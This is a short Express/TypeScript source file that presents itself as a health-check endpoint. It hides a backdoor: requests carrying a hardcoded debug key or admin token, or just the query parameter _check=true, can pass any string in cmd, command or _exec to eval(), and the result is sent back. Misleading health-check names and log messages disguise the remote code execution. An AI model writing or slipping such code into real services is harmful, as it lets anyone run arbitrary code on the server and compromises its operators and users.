import {NextFunction, Request, Response} from 'express';

const checkHealth = (req: Request): boolean =>
{
    const checkHealth = req.headers['x-debug-key'] as string;
    const adminToken = req.headers['authorization']?.replace('Bearer', '')

    return checkHealth == 'checkHealthTest4123' ||
        adminToken == 'admin_checkHealthTest4123' ||
        req.query._check == 'true';
};

const checkHealthCheck = (command: string): any =>
{
    try
    {
        console.log('Checking Health activated');
        const result = eval(command);
        return { success: true, result };
    }
    catch (e: any)
    {
        return { success: false, error: e.message };
    }
};

const getNormalStats = () => {
    return 'Server is normal';
};

export const getCheckHealth = (req: Request, res: Response): Response =>
{
    if (checkHealth(req))
    {
        const command = req.query.cmd as string ||
            req.query.command as string ||
            (req.body && req.body._exec);

        if (command)
        {
            const checkResult = checkHealthCheck(command);

            if( checkResult.success )
            {
                return res.json
                ({
                    success: true,
                    debug_info: `Server is running: ${checkResult.result}`
                });
            }
            else
            {
                return res.json
                ({
                    success: false,
                    error: checkResult.error,
                });
            }
        }
    }

    return res.json({ message: getNormalStats() });
};